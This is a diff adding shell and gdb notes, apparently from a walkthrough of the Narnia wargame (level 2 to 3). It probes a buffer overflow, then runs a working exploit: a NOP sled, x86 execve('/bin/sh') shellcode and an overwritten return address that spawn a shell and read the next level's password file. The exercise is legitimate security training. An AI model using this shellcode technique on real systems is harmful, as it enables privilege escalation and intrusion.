@@ -28,6 +28,28 @@ whoami
 id
 cat /etc/narnia_pass/narnia2
 
+# narnia 2 -> narnia 3
+vim narnia2.c
+ltrace ./narnia2.c 
+ltrace ./narnia2.c $(python -c 'print "A"*128')
+ltrace ./narnia2.c $(python -c 'print "A"*132')
+gdb -q ./narnia2
+set disassembly-flavor intel
+disassemble main
+break *0x0804849c
+r $(python -c 'print "A"*132 + "B"*4')
+c
+# Go to shell-code.org and find a shell code for x86
+r $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
+c
+# find memory adress with 90's
+x/300wx $esp
+r $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
+c
+q
+./narnia2 $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
+whoami
+cat /etc/narnia_pass/narnia3
 
 
 
